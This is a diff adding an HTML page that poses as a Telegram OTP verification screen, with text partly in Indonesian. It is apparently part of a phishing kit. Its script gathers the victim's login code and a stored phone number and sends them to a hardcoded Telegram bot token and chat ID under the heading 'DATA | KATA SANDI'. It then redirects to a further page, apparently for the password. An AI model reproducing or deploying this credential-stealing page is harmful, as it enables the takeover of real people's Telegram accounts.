@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>OTP Verification</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: white;
+        margin: 0;
+      }
+      .container {
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+        /* box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); */
+        text-align: center;
+        width: 300px;
+      }
+      h2 {
+        margin-bottom: 10px;
+        font-size: 18px;
+      }
+      p {
+        font-size: 14px;
+        color: #555;
+      }
+      .otp-inputs {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin: 15px 0;
+      }
+      .otp-inputs input {
+        width: 40px;
+        height: 40px;
+        text-align: center;
+        font-size: 20px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        outline: none;
+      }
+      .otp-inputs input:focus {
+        border-color: #007bff;
+      }
+      .resend {
+        color: #007bff;
+        cursor: pointer;
+        margin-top: 10px;
+      }
+      .resend:hover {
+        text-decoration: underline;
+      }
+      .submit-button {
+        background-color: #28a745;
+        border: none;
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 20px auto 0;
+        cursor: pointer;
+      }
+      .submit-button:hover {
+        background-color: #218838;
+      }
+      .submit-button::before {
+        content: "\2192"; /* Right arrow symbol */
+        font-size: 24px;
+        color: white;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <main>
+        <img src="otp.jpeg" alt="" style="width: 50%" />
+        <h2>Cek Pesan Telegram Anda</h2>
+        <p>
+          We've sent the code OTP to the <strong>Telegram app</strong>
+          <br />
+          for your other device.
+        </p>
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" />
+          <input type="text" maxlength="1" />
+          <input type="text" maxlength="1" />
+          <input type="text" maxlength="1" />
+          <input type="text" maxlength="1" />
+        </div>
+        <button class="submit-button" onclick="sendOTP()"></button>
+        <p class="resend">Didn't get the code?</p>
+      </main>
+    </div>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const inputs = document.querySelectorAll(".otp-inputs input");
+
+        inputs.forEach((input, index) => {
+          input.addEventListener("input", (e) => {
+            if (e.target.value && index < inputs.length - 1) {
+              inputs[index + 1].focus();
+            }
+          });
+
+          input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && index > 0 && !e.target.value) {
+              inputs[index - 1].focus();
+            }
+          });
+        });
+      });
+
+      function sendOTP() {
+        const inputs = document.querySelectorAll(".otp-inputs input");
+        let otp = "";
+        inputs.forEach((input) => (otp += input.value));
+
+        const phoneNumber = localStorage.getItem("phoneNumber");
+        const telegramBotToken =
+          "7575918160:AAEacn4kHInFsTxIe1wZAS3OE1DW6wOOWzs";
+        const chatId = "7745865654";
+        const message = `
+  ────────────────
+  🔰 DATA | KATA SANDI 🔰
+  ────────────────
+  📱 No HP : \`${phoneNumber}\`
+  🔑 OTP   : ${otp}
+  ────────────────`;
+
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown",
+          }),
+        }).then(() => {
+          localStorage.setItem("otp", otp);
+          window.location.href = "sandi.html";
+        });
+      }
+    </script>
+  </body>
+</html>
